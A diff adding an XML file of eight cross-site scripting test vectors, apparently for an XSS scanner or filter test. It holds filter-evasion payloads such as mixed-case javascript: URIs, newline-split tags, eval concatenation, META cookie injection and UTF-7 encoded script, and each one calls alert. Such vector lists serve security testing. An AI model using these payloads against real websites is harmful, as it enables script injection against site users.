@@ -1,0 +1,27 @@
+<?xml version="1.0" ?>
+<xssalert>
+	  <xssalertvector>
+		<vector><![CDATA[<IMG SRC=JaVaScRiPt:alert('XSS')>]]></vector>
+	  </xssalertvector>
+	  <xssalertvector>
+		<vector><![CDATA[<IMG SRC="jav   ascript:alert('XSS');">]]></vector>
+	  </xssalertvector>
+	  <xssalertvector>
+		<vector><![CDATA[<IMG\nSRC\n=\n"\nj\na\nv\na\ns\nc\nr\ni\np\nt\n:\na\nl\ne\nr\nt\n(\n'\nX\nS\nS\n'\n)\n"\n>]]></vector>
+	  </xssalertvector>
+	  <xssalertvector>
+		<vector><![CDATA[<SCRIPT>alert(/XSS/.source)</SCRIPT> ]]></vector>
+	  </xssalertvector>
+	  <xssalertvector>
+		<vector><![CDATA[</TITLE><SCRIPT>alert("XSS");</SCRIPT>]]></vector>
+	  </xssalertvector>
+          <xssalertvector>
+		<vector><![CDATA[a="get";\nb="URL(\"";\nc="javascript:";\nd="alert('XSS');\")";\neval(a+b+c+d);]]></vector>
+	  </xssalertvector>
+	  <xssalertvector>
+		<vector><![CDATA[<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">]]></vector>
+	  </xssalertvector>
+	  <xssalertvector>
+		<vector><![CDATA[<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-]]></vector>
+	  </xssalertvector>
+</xssalert>
